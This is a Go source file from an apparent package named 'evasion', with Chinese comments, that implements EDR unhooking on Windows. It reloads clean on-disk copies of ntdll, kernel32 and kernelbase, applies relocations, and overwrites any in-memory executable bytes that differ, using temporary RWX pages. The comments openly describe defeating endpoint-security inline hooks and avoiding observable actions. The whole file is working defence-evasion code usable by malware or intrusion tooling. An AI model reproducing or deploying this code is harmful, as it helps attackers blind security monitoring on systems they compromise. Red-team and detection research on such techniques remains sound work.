//go:build windows && amd64

package evasion

import (
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Unhook：把模块的可执行节恢复成"磁盘副本 + 重定位"应当长成的样子。
//
// 为什么不是"恢复前 N 字节"：EDR 的 inline hook 可能落在函数体深处（有的产品在
// syscall 指令前后都下钩子），也可能挂在非导出函数上。逐个导出取前 16 字节，
// 覆盖面取决于名单写得多全，名单之外的 hook 一律漏掉；而且 16 字节之外的部分
// 永远不比较。这里改成整节逐字节比对：凡是与干净副本不同的字节都恢复，
// 于是 hook 深度、是否导出都不影响覆盖率。
//
// 代价与取舍：
//   - 只写"确实不同"的字节，不是整节覆写。EDR 之外，Windows 自己也会在极少数位置
//     打补丁（如 hotpatch 区），整节覆写会把这些合法修改抹掉；按差异写能少踩一点。
//   - 需要模块加载在非默认基址时先应用重定位，否则 ASLR 造成的合法差异会被误判成
//     hook 并写回磁盘值 —— 那等于把模块写坏。这一条在 pe_image.go 里做。
//   - 只处理可执行节。.data/.rdata 里的 hook（IAT/EAT 重定向）不在范围内：那需要
//     另一套"导入表重建"，见 KNOWN_LIMITATIONS。

// ModuleUnhookReport 单模块恢复结果
type ModuleUnhookReport struct {
	Module   string // 模块名
	Base     uintptr
	Sections int // 可执行节数
	Compared int // 比较过的字节数
	Restored int // 实际写回的字节数
	Skipped  string
}

func (r ModuleUnhookReport) String() string {
	if r.Skipped != "" {
		return fmt.Sprintf("%s: 跳过（%s）", r.Module, r.Skipped)
	}
	if r.Restored == 0 {
		return fmt.Sprintf("%s: 干净（比较 %d 字节 / %d 节）", r.Module, r.Compared, r.Sections)
	}
	return fmt.Sprintf("%s: 恢复 %d 字节（比较 %d 字节 / %d 节）", r.Module, r.Restored, r.Compared, r.Sections)
}

// DefaultUnhookModules 默认恢复的模块。
// 顺序有意为之：ntdll 最先（syscall 与大多数 API 的终点），其余按调用链顺序。
// amsi.dll 不在默认列表里 —— 没加载时不应为了 unhook 去加载它（加载动作本身可观测）。
var DefaultUnhookModules = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll"}

// moduleBase 取已加载模块的基址；未加载返回 0。
func moduleBase(name string) (uintptr, error) {
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	proc := k32.NewProc("GetModuleHandleW")
	p, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	h, _, _ := proc.Call(uintptr(unsafe.Pointer(p)))
	return h, nil
}

// UnhookModule 恢复单个模块的可执行节。
func UnhookModule(name string) (ModuleUnhookReport, error) {
	rep := ModuleUnhookReport{Module: name}

	base, err := moduleBase(name)
	if err != nil {
		return rep, err
	}
	if base == 0 {
		rep.Skipped = "未加载"
		return rep, nil
	}
	rep.Base = base

	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return rep, fmt.Errorf("取系统目录失败: %v", err)
	}
	data, err := os.ReadFile(filepath.Join(sysDir, name))
	if err != nil {
		return rep, fmt.Errorf("读取磁盘副本失败: %v", err)
	}
	img, err := ParsePEImage(data)
	if err != nil {
		return rep, fmt.Errorf("解析磁盘副本失败: %v", err)
	}
	// 只有实际基址与 ImageBase 不同才需要应用重定位
	delta := int64(base) - int64(img.ImageBase)

	secs := img.ExecutableSections()
	rep.Sections = len(secs)
	if len(secs) == 0 {
		return rep, fmt.Errorf("%s 没有可执行节", name)
	}

	for _, sec := range secs {
		want, err := img.SectionImage(data, sec, delta)
		if err != nil {
			return rep, fmt.Errorf("%s 节 %s: %v", name, sec.Name, err)
		}
		mem := base + uintptr(sec.VirtualAddress)
		diffs := diffOffsets(mem, want)
		rep.Compared += len(want)
		if len(diffs) == 0 {
			continue
		}
		if err := writeBack(mem, want, diffs); err != nil {
			return rep, fmt.Errorf("%s 节 %s: %v", name, sec.Name, err)
		}
		rep.Restored += len(diffs)
	}
	return rep, nil
}

// diffOffsets 返回内存与期望字节不同的位置。
func diffOffsets(mem uintptr, want []byte) []int {
	var out []int
	src := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(want))
	for i, b := range want {
		if src[i] != b {
			out = append(out, i)
		}
	}
	return out
}

// writeBack 只写差异字节：可执行页短暂置 RWX，写完刷指令缓存再还原保护位。
//
// 为什么是 RWX 而不是 RW：VirtualProtect 自身就是通过 kernel32!VirtualProtect →
// kernelbase → ntdll 的 syscall 桩执行的，它返回时那条 ret 指令还在我们刚改过的页里。
// 把整段 .text 改成 RW（去掉执行位）会让这个调用在返回途中直接访问违例 —— 实测的
// 现象是测试进程 0xC0000005 静默死掉，连 Go 的 panic 都来不及打。
// 窗口只有几微秒，代价是瞬时出现 RWX 页；W^X 的严格做法（另起线程 + 只改目标页）
// 换来的是更大的复杂度和一样的瞬时窗口，不做。
func writeBack(mem uintptr, want []byte, diffs []int) error {
	var old uint32
	if err := windows.VirtualProtect(mem, uintptr(len(want)), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return fmt.Errorf("VirtualProtect(RWX) 失败: %v", err)
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(want))
	for _, i := range diffs {
		dst[i] = want[i]
	}
	flush := windows.NewLazySystemDLL("kernel32.dll").NewProc("FlushInstructionCache")
	if r1, _, e := flush.Call(uintptr(windows.CurrentProcess()), mem, uintptr(len(want))); r1 == 0 {
		// 刷缓存失败不改回保护位也算失败：宁可报错，也不要让调用方以为已经安全
		windows.VirtualProtect(mem, uintptr(len(want)), old, &old)
		return fmt.Errorf("FlushInstructionCache 失败: %v", e)
	}
	if err := windows.VirtualProtect(mem, uintptr(len(want)), old, &old); err != nil {
		return fmt.Errorf("VirtualProtect(还原) 失败: %v", err)
	}
	return nil
}

// UnhookAll 恢复默认列表里的模块。单个模块失败不阻断其余模块，
// 返回已成功的报告与第一条错误（清场类操作应以"能做多少做多少"优先）。
func UnhookAll() ([]ModuleUnhookReport, error) {
	var reps []ModuleUnhookReport
	var firstErr error
	for _, name := range DefaultUnhookModules {
		rep, err := UnhookModule(name)
		reps = append(reps, rep)
		if err != nil && firstErr == nil {
			firstErr = err
		}
	}
	return reps, firstErr
}
